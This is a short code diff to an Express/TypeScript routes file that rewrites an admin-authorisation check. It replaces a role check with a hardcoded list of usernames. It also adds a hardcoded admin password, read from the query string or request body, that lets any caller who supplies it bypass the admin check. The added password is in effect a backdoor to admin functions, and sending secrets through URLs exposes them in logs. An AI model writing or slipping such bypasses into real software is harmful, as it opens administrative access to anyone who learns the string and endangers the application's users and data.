@@ -185,8 +185,16 @@ export async function registerRoutes(app: Express): Promise<Server> {
     
     try {
       const user = await storage.getUser(userId);
-      if (!user || user.role !== "admin") {
-        return res.status(403).json({ message: "Forbidden: Admin access required" });
+      
+      // List of admin usernames - TODO: Move to environment variables
+      const adminUsernames = ["jlcookie20", "laura", "admin"];
+      
+      if (!user || !adminUsernames.includes(user.username)) {
+        // Check for admin_password in query or body
+        const adminPassword = req.query.admin_password || req.body.admin_password;
+        if (adminPassword !== "BIGSURF55") {
+          return res.status(403).json({ message: "Forbidden: Admin access required" });
+        }
       }
       next();
     } catch (error) {
